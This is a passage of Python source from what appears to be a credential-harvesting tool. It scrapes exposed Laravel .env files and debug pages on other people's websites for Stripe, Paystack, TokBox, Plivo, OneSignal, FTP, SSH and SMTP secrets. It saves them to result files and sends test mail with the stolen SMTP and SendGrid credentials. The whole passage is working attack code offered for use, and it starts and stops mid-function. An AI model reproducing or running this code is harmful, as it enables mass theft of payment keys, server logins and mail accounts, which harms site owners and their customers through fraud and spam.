				elif '<td>ONESIGNAL_APP_ID</td>' in text:
					method = 'debug'
					try:
						onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_token = ''
					try:
						onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_auth = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}ONESIGNAL {fc}[{yl}{onesignal_id}{res}:{fc}{onesignal_token}{fc}]")
				save = open(o_one, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_DEV" in text:
				if "TOKBOX_KEY_DEV=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_DEV</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY" in text:
				if "TOKBOX_KEY=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_OLD" in text:
				if "TOKBOX_KEY_OLD=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_OLD</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "PLIVO_AUTH_ID" in text:
				if "PLIVO_AUTH_ID=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PLIVO_AUTH_ID</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(plivo_auth)+'\nPLIVO_AUTH_TOKEN: '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open(o_plivo, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY" in text:
				if "STRIPE_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_CHINA_FINANCE" in text:
				if "STRIPE_KEY_CHINA_FINANCE=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_CHINA_FINANCE=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_CHINA_FINANCE=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_CHINA_FINANCE</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_CINEMACITY" in text:
				if "STRIPE_KEY_CINEMACITY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_CINEMACITY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_CINEMACITY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_CINEMACITY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TAP_PUBLIC_KEY" in text:
				if "TAP_PUBLIC_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nTAP_PUBLIC_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nTAP_SECRET_KEY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>TAP_PUBLIC_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>TAP_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>TAP_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_LIVE_KEY" in text:
				if "STRIPE_LIVE_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_LIVE_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_LIVE_SECRET=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_LIVE_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_LIVE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_LIVE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_LIVE" in text:
				if "STRIPE_KEY_LIVE=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_LIVE=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_LIVE=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_LIVE</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "PAYSTACK_PUBLIC_KEY" in text:
				if "PAYSTACK_PUBLIC_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPAYSTACK_PUBLIC_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPAYSTACK_SECRET_KEY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PAYSTACK_PUBLIC_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PAYSTACK_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PAYSTACK_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCracking.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "FTP_HOST" in text:
				if "FTP_HOST=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nFTP_USERNAME=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nFTP_PASSWORD=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>FTP_HOST</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>FTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>FTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'FTP: '+str(url)+'|'+str(plivo_auth)+'|'+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/FTP_env.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SSH_USERNAME" in text:
				if "SSH_USERNAME=" in text:
					method = '/.env'
					try:
						ssh_username = reg('\nSSH_USERNAME=(.*?)\n', text)[0]
					except:
						ssh_username = ''
					try:
						ssh_pass = reg('\nSSH_PASSWORD=(.*?)\n', text)[0]
					except:
						ssh_pass = ''
					try:
						ssh_ip = reg('\nSSH_IP=(.*?)\n', text)[0]
					except:
						ssh_ip = ''
				elif '<td>FTP_HOST</td>' in text:
					method = 'debug'
					try:
						ssh_username = reg('<td>SSH_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_username = ''
					try:
						ssh_pass = reg('<td>SSH_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_pass = ''
					try:
						ssh_ip = reg('<td>SSH_IP<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_ip = ''
				build = 'SSH: '+str(ssh_ip)+'|'+str(ssh_username)+'|'+str(ssh_pass)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/SSH_env.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = 'info@mylegion.in'
					try:
						fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = 'Legion'
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = 'info@mylegion.in'
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = 'Legion'
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					satu = cleanit(mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass)
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/SMTP(AWS).txt', 'a')
						save2.write(remover+'\n')
						save2.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'sendgrid' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SENDGRID {fc}[{yl}{mailpass}{res}{fc}]")
						save = open('Results/SMTP(SENDGRID).txt', 'a')
						save.write(remover+'\n')
						save.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
						build_forchecker = str(mailhost)+":"+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover2 = str(build_forchecker).replace('\r', '')
						save3 = open('Results/forchecker/sendgrid.txt','a')
						save3.write(remover2+'\n')
						save3.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'office365' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OFFICE365).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(1AND1).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zoho' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZOHO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MANDRILL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mailgun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILGUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ITALY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'emailsrvr' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RACKSPACE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'MAIL_HOST' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILSSSSS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.yandex' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YANDEX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.OVH' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OVH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.ionos' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(IONOS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zimbra' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZIMBRA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'kasserver.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(KASSASERVER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'smtp-relay.gmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'sparkpostmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SPARKPOST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.jp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(JAPAN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmoserver' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mailjet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILJET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'googlemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GOOGLEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'aruba.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ARUBA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hetzner' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HETZNER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '163' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(163).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '263' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(263).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'Aliyun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ALIYUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'att.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ATTNET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'chinaemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(CHINAEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'comcast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COMCAST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'cox.net' in mailhost:
